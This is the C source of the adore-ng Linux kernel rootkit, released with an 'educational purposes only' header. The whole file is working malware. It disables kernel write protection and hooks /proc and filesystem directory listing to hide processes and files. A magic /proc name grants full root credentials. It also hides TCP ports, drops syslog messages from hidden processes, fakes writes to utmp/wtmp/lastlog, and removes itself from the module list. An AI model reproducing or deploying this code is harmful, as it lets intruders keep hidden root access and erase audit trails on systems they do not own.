/*** (C) 2004-2005 by Stealth
 *** http://stealth.scorpions.net/rootkits
 *** http://stealth.openwall.net/rootkits
 *** 
 *** 2008 wzt -- Fix gcc complier warnnings.
 ***	
 *** http://www.xsec.org
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 ***/
#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#define LINUX26

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/proc_fs.h>
#include <linux/capability.h>
#include <linux/spinlock.h>
#include <linux/pid.h>
#include <linux/init.h>
#include <linux/seq_file.h>
#include <linux/cred.h>

#include <net/sock.h>
#include <net/tcp.h>
#include <linux/un.h>
#include <net/af_unix.h>
#include <linux/aio.h>
#include <linux/list.h>
#include <linux/sysfs.h>
#include <linux/version.h>

#include "adore-ng.h"

#ifdef __x86_64__
uint64_t orig_cr0;
uint64_t clear_return_cr0(void)
{
	uint64_t cr0 = 0;
	uint64_t ret;
	asm volatile ("mov %%cr0, %%rax"
	:"=a"(cr0)
	);
	ret = cr0;
	cr0 &= 0xfffeffff;
	asm volatile ("mov %%rax, %%cr0"
	:
	:"a"(cr0)
	);
	return ret;
}
void setback_cr0(uint64_t val)
{
	asm volatile ("mov %%rax, %%cr0"
	:
	:"a"(val)
	);
}
#else
unsigned orig_cr0;
/*清除cr0寄存器的写保护位，第16位为WP写保护位*/
unsigned clear_return_cr0(void)
{
	unsigned cr0 = 0;
	unsigned ret;
	asm volatile ("movl %%cr0, %%eax"
	:"=a"(cr0)
	);
	ret = cr0;
	cr0 &= 0xfffeffff;
	asm volatile ("movl %%eax, %%cr0"
	:
	:"a"(cr0)
	);
	return ret;
}
/*用orig_cr0恢复cr0寄存器*/
void setback_cr0(unsigned val)
{
	asm volatile ("movl %%eax, %%cr0"
	:
	:"a"(val)
	);
}
#endif

char *proc_fs = "/proc";	/* default proc FS to hide processes */
char *root_fs = "/";		/* default FS to hide files */
char *opt_fs = NULL;

typedef int (*readdir_t)(struct file *, void *, filldir_t);
readdir_t orig_root_readdir = NULL, orig_opt_readdir = NULL;
readdir_t orig_proc_readdir = NULL;

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))	
typedef int (*iterate_dir_t)(struct file *, struct dir_context *);
iterate_dir_t orig_root_iterate = NULL;
iterate_dir_t orig_opt_iterate = NULL;
iterate_dir_t orig_proc_iterate = NULL;
#endif

struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
                                   struct nameidata *) = NULL;

#ifndef PID_MAX
#define PID_MAX 0x8000
#endif

static char hidden_procs[PID_MAX/8+1];

inline void hide_proc(pid_t x)
{
	if (x >= PID_MAX || x == 1)
		return;
	hidden_procs[x/8] |= 1<<(x%8);
}

inline void unhide_proc(pid_t x)
{
	if (x >= PID_MAX)
		return;
	hidden_procs[x/8] &= ~(1<<(x%8));
}

inline char is_invisible(pid_t x)
{
	if (x >= PID_MAX)
		return 0;
	return hidden_procs[x/8]&(1<<(x%8));
}

/* Theres some crap after the PID-filename on proc
 * getdents() so the semantics of this function changed:
 * Make "672" -> 672 and
 * "672|@\"   -> 672 too
 */
int adore_atoi(const char *str)
{
	int ret = 0, mul = 1;
	const char *ptr;
   
	for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
		;
	ptr--;
	while (ptr >= str) {
		if (*ptr < '0' || *ptr > '9')
			break;
		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;
	}
	return ret;
}

/* Own implementation of find_task_by_pid() */
struct task_struct *adore_find_task(pid_t pid)
{
	struct task_struct *p;  

	//read_lock(&tasklist_lock);	
	for_each_task(p) {
		if (p->pid == pid) {
	//		read_unlock(&tasklist_lock);
			return p;
		}
	}
	//read_unlock(&tasklist_lock);
	return NULL;
}

int should_be_hidden(pid_t pid)
{
	struct task_struct *p = NULL;

	if (is_invisible(pid)) {
		return 1;
	}

	p = adore_find_task(pid);
	if (!p)
		return 0;

	/* If the parent is hidden, we are hidden too XXX */
	task_lock(p);

	if (is_invisible(p->parent->pid)) {
		task_unlock(p);
		hide_proc(pid);
		return 1;
	}

	task_unlock(p);
	return 0;
}
#ifndef cap_set_full
#ifndef CAP_FULL_SET
# define CAP_FULL_SET     ((kernel_cap_t){{ ~0, ~0 }})
#endif
#ifndef cap_set_full
# define cap_set_full(c)      do { (c) = ((kernel_cap_t){{ ~0, ~0 }}); } while (0)
#endif
#endif

#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
#define PATCH_UID 
#else
#define PATCH_UID .val
#endif

/* You can control adore-ng without ava too:
 *
 * echo > /proc/<ADORE_KEY> will make the shell authenticated,
 * echo > /proc/<ADORE_KEY>-fullprivs will give UID 0,
 * cat /proc/hide-<PID> from such a shell will hide PID,
 * cat /proc/unhide-<PID> will unhide the process
 */
struct dentry *adore_lookup(struct inode *i, struct dentry *d,
                            struct nameidata *nd)
{
	struct cred *edit_cred = (struct cred *)current->cred;
	task_lock(current);

	if (strncmp(ADORE_KEY, d->d_iname, strlen(ADORE_KEY)) == 0) {
		current->flags |= PF_AUTH;
		edit_cred->suid PATCH_UID = ADORE_VERSION;
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "fullprivs", 9) == 0) {
		edit_cred->uid PATCH_UID = 0;
		edit_cred->suid PATCH_UID = 0;
		edit_cred->euid PATCH_UID = 0;
	    edit_cred->gid PATCH_UID = 0;
		edit_cred->egid PATCH_UID = 0;
	    edit_cred->fsuid PATCH_UID = 0;
		edit_cred->fsgid PATCH_UID = 0;

		cap_set_full(edit_cred->cap_effective);
		cap_set_full(edit_cred->cap_inheritable);
		cap_set_full(edit_cred->cap_permitted);
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "hide-", 5) == 0) {
		hide_proc(adore_atoi(d->d_iname+5));
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "unhide-", 7) == 0) {
		unhide_proc(adore_atoi(d->d_iname+7));
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "uninstall", 9) == 0) {
		cleanup_module();
	}

	task_unlock(current);

	if (should_be_hidden(adore_atoi(d->d_iname)) &&
	/* A hidden ps must be able to see itself! */
	    !should_be_hidden(current->pid))
		return NULL;

	return orig_proc_lookup(i, d, nd);
}

filldir_t proc_filldir = NULL;
DEFINE_SPINLOCK(proc_filldir_lock);

int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
{
	char abuf[128];

	memset(abuf, 0, sizeof(abuf));
	memcpy(abuf, name, nlen < sizeof(abuf) ? nlen : sizeof(abuf) - 1);

	if (should_be_hidden(adore_atoi(abuf)))
		return 0;

	if (proc_filldir)
		return proc_filldir(buf, name, nlen, off, ino, x);
	return 0;
}

int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	spin_lock(&proc_filldir_lock);
	proc_filldir = filldir;
	r = orig_proc_readdir(fp, buf, adore_proc_filldir);
	spin_unlock(&proc_filldir_lock);
	return r;
}


filldir_t opt_filldir = NULL;
struct dentry *parent_opt_dir[1024];

int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
{
	struct inode *inode = NULL;
	struct dentry *dentry = NULL;
	struct qstr this;
	struct dentry *dir = parent_opt_dir[current->pid % 1024];
	int r = 0;
	uid_t uid;
	gid_t gid;

	if (!dir)
		return 0;
	this.name = name;
	this.len = nlen;
	this.hash = full_name_hash(this.name, this.len);
	dentry  = d_lookup(dir, &this);
	if (!dentry) {
		dentry = d_alloc(dir, &this);
		if (!dentry) {
			return 0;
		}
		if (!dir->d_inode->i_op->lookup)
			return 0;
		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, NULL) != 0) {
			return 0;
		}
	}
	if(!(inode = dentry->d_inode))
		return 0;

	uid = inode->i_uid PATCH_UID ;
	gid = inode->i_gid PATCH_UID;

	iput(inode);
	dput(dentry);
/*
	if (reiser) {
		if (inode->i_state & I_NEW)
			unlock_new_inode(inode);
	}

	iput(inode);
*/
	/* Is it hidden ? */
	if (uid == ELITE_UID && gid == ELITE_GID) {
		r = 0;
	} else if (opt_filldir)
		r = opt_filldir(buf, name, nlen, off, ino, x);

	return r;
}


int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
		return 0;

	opt_filldir = filldir;
	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
	r = orig_opt_readdir(fp, buf, adore_opt_filldir);
	
	return r;
}



/* About the locking of these global vars:
 * I used to lock these via rwlocks but on SMP systems this can cause
 * a deadlock because the iget() locks an inode itself and I guess this
 * could cause a locking situation of AB BA. So, I do not lock root_sb and
 * root_filldir (same with opt_) anymore. root_filldir should anyway always
 * be the same (filldir64 or filldir, depending on the libc). The worst thing
 * that could happen is that 2 processes call filldir where the 2nd is
 * replacing root_sb which affects the 1st process which AT WORST CASE shows
 * the hidden files.
 * Following conditions have to be met then: 1. SMP 2. 2 processes calling
 * getdents() on 2 different partitions with the same FS.
 * Now, since I made an array of super_blocks it must also be that the PIDs of
 * these procs have to be the same PID modulo 1024. This sitation (all 3 cases
 * must be met) should be very very rare.
 */
filldir_t root_filldir = NULL;
//struct super_block *root_sb[1024];
struct dentry *parent_dir[1024];

int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
{
	struct inode *inode = NULL;
	struct dentry *dentry = NULL;
	struct qstr this;
	struct dentry *dir = parent_dir[current->pid % 1024];
	int r = 0;
	uid_t uid;
	gid_t gid;

	if (!dir)
		return 0;
	
	/* Theres an odd 2.6 behaivior. iget() crashes on ReiserFS! using iget_locked
	 * without the unlock_new_inode() doesnt crash, but deadlocks
	 * time to time. So I basically emulate iget() without
	 * the sb->s_op->read_inode(inode); and so it doesnt crash or deadlock.
	 */
	 
	 if(strcmp(name, ".") == 0 || strcmp(name , "..") == 0)
		return root_filldir(buf, name, nlen, off, ino, x);
	 
	/*下面的代码可以用这个代替，但是内核警告说最好不要用这个函数
	 *struct dentry *lookup_one_len(const char *name, struct dentry *base, int len)
	 */
	this.name = name;
	this.len = nlen;
	this.hash = full_name_hash(this.name, this.len);
	dentry  = d_lookup(dir, &this);
	if (!dentry) {
		dentry = d_alloc(dir, &this);
		if (!dentry) {
			return 0;
		}
		if (!dir->d_inode->i_op->lookup)
			return 0;
		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, NULL) != 0) {
			printk("lookup failed\n");
			return 0;
		}
	}
	if(!(inode = dentry->d_inode)) {
		return 0;
	}
	
	uid = inode->i_uid PATCH_UID;
	gid = inode->i_gid PATCH_UID;
	
	//iput(inode);
	//dput(dentry);
	
	/* Is it hidden ? */
	if (uid == ELITE_UID && gid == ELITE_GID) {
		r = 0;
	} else if (root_filldir) {
		r = root_filldir(buf, name, nlen, off, ino, x);
	}

	return r;
}

int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
		return 0;

	root_filldir = filldir;
	parent_dir[current->pid % 1024] = fp->f_dentry;
	r = orig_root_readdir(fp, buf, adore_root_filldir);
	
	return r;
}

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))

static int adore_opt_iterate(struct file *fp, struct dir_context *ctx)
{
	int r = 0;
	struct dir_context new_ctx = {
		.actor = adore_proc_filldir
	};
	
	if (!fp || !fp->f_dentry || !orig_opt_iterate)
		return 0;

	opt_filldir = ctx->actor;
	memcpy(ctx, &new_ctx, sizeof(readdir_t));
	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
	r = orig_opt_iterate(fp, ctx);
	
	return r;
}

static int adore_proc_iterate(struct file *fp, struct dir_context *ctx)
{
	int r = 0;
	struct dir_context new_ctx = {
		.actor = adore_proc_filldir
	};
	
	spin_lock(&proc_filldir_lock);
	proc_filldir = ctx->actor;
	memcpy(ctx, &new_ctx, sizeof(readdir_t));
	r = orig_proc_iterate(fp, ctx);
	spin_unlock(&proc_filldir_lock);
	return r;
}

static int adore_root_iterate(struct file *fp, struct dir_context *ctx)
{
	int r = 0;
	struct dir_context new_ctx = {
		.actor = adore_root_filldir
	};
	
	if (!fp || !fp->f_dentry || !orig_root_iterate)
		return -ENOTDIR;
	
	root_filldir = ctx->actor;
	parent_dir[current->pid % 1024] = fp->f_dentry;
	
	memcpy(ctx, &new_ctx, sizeof(readdir_t));
	r = orig_root_iterate(fp, ctx);
	
	return r;
}
#endif

int patch_vfs(const char *p, 
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
			readdir_t *orig_readdir, readdir_t new_readdir
#else
			iterate_dir_t *orig_iterate, iterate_dir_t new_iterate
#endif
			)
{
	struct file_operations *new_op;
	struct file *filep;

	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
        return -1;
	}
	
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
	if (orig_readdir)
		*orig_readdir = filep->f_op->readdir;
#else
	if (orig_iterate)
		*orig_iterate = filep->f_op->iterate;
#endif

	new_op = (struct file_operations *)filep->f_op;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
	new_op->readdir = new_readdir;
#else
	new_op->iterate = new_iterate;
	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
#endif

	filep->f_op = new_op;
	filp_close(filep, 0);
	return 0;
}

int unpatch_vfs(const char *p, 
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
				readdir_t orig_readdir
#else
				iterate_dir_t orig_iterate
#endif
				)
{
    struct file_operations *new_op;
	struct file *filep;
	
    filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
        return -1;
	}

	new_op = (struct file_operations *)filep->f_op;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
	new_op->readdir = orig_readdir;
#else
	printk("unpatch starting, %p --> %p\n", new_op->iterate, orig_iterate);
	new_op->iterate = orig_iterate;
#endif
		
	filp_close(filep, 0);
	return 0;
}


char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
	if (s-haystack+strlen(needle) <= n)
		return s;
	else
		return NULL;
}

struct file *var_files[] = {
	NULL,
	NULL,
	NULL,
	NULL
};

char *var_filenames[] = {
	"/var/run/utmp",
	"/var/log/wtmp",
	"/var/log/lastlog",
	NULL
};

ssize_t (*orig_var_write)(struct file *, const char *, size_t, loff_t *) = NULL;

ssize_t adore_var_write(struct file *f, const char *buf, size_t blen, loff_t *off)
{
	int i = 0;

	/* If its hidden and if it has no special privileges and
	 * if it tries to write to the /var files, fake it
	 */
	if (should_be_hidden(current->pid) &&
	    !(current->flags & PF_AUTH)) {
		for (i = 0; var_filenames[i]; ++i) {
			if (var_files[i] &&
			    var_files[i]->f_dentry->d_inode->i_ino == f->f_dentry->d_inode->i_ino) {
				*off += blen;
				return blen;
			}
		}
	}
	return orig_var_write(f, buf, blen, off);
}	

#ifndef kobject_unregister
void kobject_unregister(struct kobject * kobj)
{
	if (!kobj)
		return;
	
	pr_debug("kobject %s: unregistering\n",kobject_name(kobj));
	kobject_uevent(kobj, KOBJ_REMOVE);
	kobject_del(kobj);
	kobject_put(kobj);
}
#endif

#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0))
struct tcp_seq_afinfo *proc_find_tcp_seq(void)
{
	struct proc_dir_entry *pde = init_net.proc_net->subdir;

	while (strcmp(pde->name, "tcp"))
		pde = pde->next;

	return (struct tcp_seq_afinfo*)pde->data;
}
#else
struct tcp_seq_afinfo *proc_find_tcp_seq(void)
{
	struct file *filep;
	struct tcp_seq_afinfo *afinfo;

	filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
	if(!filep) return NULL;
	
	afinfo = PDE_DATA(filep->f_dentry->d_inode);
	filp_close(filep, 0);
	
	return afinfo;
}
#endif
#define NET_CHUNK 150

int (*orig_tcp4_seq_show)(struct seq_file*, void *) = NULL;

int adore_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int i = 0, r = 0;
	char port[12];

	r = orig_tcp4_seq_show(seq, v);
	for (i = 0; HIDDEN_SERVICES[i]; ++i) {
		sprintf(port, ":%04X", HIDDEN_SERVICES[i]);
		/* Ignore hidden blocks */
		if (strnstr(seq->buf + seq->count-NET_CHUNK,port,NET_CHUNK)) {
			seq->count -= NET_CHUNK;
			break;
		}
	}
	
	return r;
}

#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
#ifndef UNIXCREDS
#define UNIXCREDS(skb)	(&UNIXCB((skb)).cred)
#endif
#endif

static
int (*orig_unix_dgram_recvmsg)(struct kiocb *, struct socket *, struct msghdr *,
                               size_t, int) = NULL;
static struct proto_ops *unix_dgram_ops = NULL;

int adore_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock,
                             struct msghdr *msg, size_t size, int flags)
{
	struct sock *sk = NULL;
	int noblock = flags & MSG_DONTWAIT;
	struct sk_buff *skb = NULL;
	int err;
	struct ucred *creds = NULL;
	int not_done = 1;
	__u32	pid;

	if (strncmp(current->comm, "syslog", 6) != 0 || !msg || !sock)
		goto out;

	sk = sock->sk;

	err = -EOPNOTSUPP;
	if (flags & MSG_OOB)
		goto out;

	do {
		msg->msg_namelen = 0;
		skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
		if (!skb) goto out;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
		creds = UNIXCREDS(skb);
		if (!creds) goto out;
		pid = creds->pid;
#else
		pid = pid_vnr(UNIXCB(skb).pid);
#endif			
		if ((not_done = should_be_hidden(pid)))
			skb_dequeue(&sk->sk_receive_queue);
	} while (not_done);

out:
	err = orig_unix_dgram_recvmsg(kio, sock, msg, size, flags);
        return err;
}

static int patch_syslog(void)
{
	struct socket *sock = NULL;
#ifdef MODIFY_PAGE_TABLES
	pgd_t *pgd = NULL;
	pmd_t *pmd = NULL;
	pte_t *pte = NULL, new_pte;
#ifdef FOUR_LEVEL_PAGING
	pud_t *pud = NULL;
#endif
#endif

	/* PF_UNIX, SOCK_DGRAM */
	if (sock_create(1, 2, 0, &sock) < 0)
		return -1;

#ifdef MODIFY_PAGE_TABLES
	pgd = pgd_offset_k((unsigned long)sock->ops);
#ifdef FOUR_LEVEL_PAGING
	pud = pud_offset(pgd, (unsigned long)sock->ops);
	pmd = pmd_offset(pud, (unsigned long)sock->ops);
#else
	pmd = pmd_offset(pgd, (unsigned long)sock->ops);
#endif
	pte = pte_offset_kernel(pmd, (unsigned long)sock->ops);
	new_pte = pte_mkwrite(*pte);
	set_pte(pte, new_pte);

#endif /* Page-table stuff */

	if (sock && (unix_dgram_ops = (struct proto_ops *)sock->ops)) {
		orig_unix_dgram_recvmsg = unix_dgram_ops->recvmsg;
		unix_dgram_ops->recvmsg = adore_unix_dgram_recvmsg;
		sock_release(sock);
	}

	return 0;
}

struct tcp_seq_afinfo *t_afinfo = NULL;

int __init adore_init(void)
{
	struct file_operations *new_op;
	struct inode_operations *new_inode_op;
	int i = 0, j = 0;
	struct file *filep;
	struct list_head *m = NULL, *p = NULL, *n = NULL;
	struct module *me = NULL;
	
	memset(hidden_procs, 0, sizeof(hidden_procs));

    filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) 
		return -1;
	
	orig_cr0 = clear_return_cr0();

	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
	orig_proc_lookup = new_inode_op->lookup;
	new_inode_op->lookup = adore_lookup;
	
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
	patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
	patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
	if (opt_fs)
		patch_vfs(opt_fs, &orig_opt_readdir, adore_opt_readdir);
#else
	patch_vfs(proc_fs, &orig_proc_iterate, adore_proc_iterate);
	patch_vfs(root_fs, &orig_root_iterate, adore_root_iterate);
	if (opt_fs)
		patch_vfs(opt_fs, &orig_opt_iterate, adore_opt_iterate);
#endif
				  
	t_afinfo = proc_find_tcp_seq();
	if (t_afinfo) {
		orig_tcp4_seq_show = t_afinfo->seq_ops.show;
		t_afinfo->seq_ops.show = adore_tcp4_seq_show;
		printk("patch proc_net: %p --> %p\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
	}
	patch_syslog();

	j = 0;
	for (i = 0; var_filenames[i]; ++i) {
		var_files[i] = filp_open(var_filenames[i], O_RDONLY, 0);
		if (IS_ERR(var_files[i])) {
			var_files[i] = NULL;
			continue;
		}
		if (!j) {	/* just replace one time, its all the same FS */
			new_op = (struct file_operations *)(var_files[i]->f_op);
			orig_var_write = new_op->write;
			new_op->write = adore_var_write;
			j = 1;
		}
	}
	filp_close(filep, 0);
	
	me = THIS_MODULE;
	m = &me->list;

/* Newer 2.6 have an entry in /sys/modules for each LKM */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,11)
	kobject_unregister(&me->mkobj.kobj);
#elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
	kobject_unregister(&me->mkobj->kobj);
#endif
	
	p = m->prev;
	n = m->next;

	n->prev = p;
	p->next = n;

	setback_cr0(orig_cr0);
	return 0;
}

void __exit adore_cleanup(void)
{
	struct file_operations *new_op;
	struct inode_operations *new_inode_op;
	int i = 0, j = 0;
	struct file *filep;
	
	if (t_afinfo && orig_tcp4_seq_show)
	{
		printk("unpatch proc_net: %p --> %p\n", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
		t_afinfo->seq_ops.show = orig_tcp4_seq_show;
	}
	
	orig_cr0 = clear_return_cr0();

	filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) 
		return ;
	
	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
	new_inode_op->lookup = orig_proc_lookup;

#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
	unpatch_vfs(proc_fs, orig_proc_readdir);
	unpatch_vfs(root_fs, orig_root_readdir);
	if (orig_opt_readdir)
		unpatch_vfs(opt_fs, orig_opt_readdir);
#else
	unpatch_vfs(proc_fs, orig_proc_iterate);
	unpatch_vfs(root_fs, orig_root_iterate);
	if (orig_opt_readdir)
		unpatch_vfs(opt_fs, orig_opt_iterate);
#endif

	j = 0;
	for (i = 0; var_filenames[i]; ++i) {
		if (var_files[i]) {
			if (!j) {
				new_op = (struct file_operations *)var_files[i]->f_op;
				new_op->write = orig_var_write;
				j = 1;
			}
			filp_close(var_files[i], 0);
		}
	}
	
	filp_close(filep, 0);
	setback_cr0(orig_cr0);
}

module_init(adore_init);
module_exit(adore_cleanup);

#ifdef CROSS_BUILD
MODULE_INFO(vermagic, "VERSION MAGIC GOES HERE");
#endif

MODULE_LICENSE("GPL");
